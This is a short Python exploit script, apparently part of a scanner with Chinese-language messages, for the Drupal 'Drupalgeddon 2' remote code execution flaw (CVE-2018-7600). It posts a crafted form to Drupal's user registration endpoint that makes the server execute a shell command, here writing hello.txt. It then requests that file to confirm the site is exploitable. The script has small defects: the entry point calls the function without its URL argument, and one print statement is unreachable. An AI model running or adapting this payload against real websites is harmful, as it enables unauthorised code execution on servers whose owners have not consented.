import sys
import requests
# https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py

'''
Usage:
    moon.py -u  drupal http://127.0.0.1:8080
    Drupal Drupalgeddon 2远程代码执行漏洞（CVE-2018-7600）
'''


def attack(URL):
    print('[+]开始检测-Drupal Drupalgeddon 2远程代码执行漏洞（CVE-2018-7600）。[+]')
    url = URL + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "^w^" | tee hello.txt'}
    # print(url)
    try:
        r = requests.post(url, data=payload, verify=False)
        check = requests.get(URL + '/hello.txt', verify=False)
        if check.status_code != 200:
            sys.exit("Not exploitable")
            print('error!')
        print('可能存在漏洞-Check: ' + URL + '/hello.txt      ^w^')
    except:
        print('someerroe!')
    print('[+]检测结束-Drupal Drupalgeddon 2远程代码执行漏洞（CVE-2018-7600）。[+]')
    print('\n')

if __name__ == "__main__":
    attack()
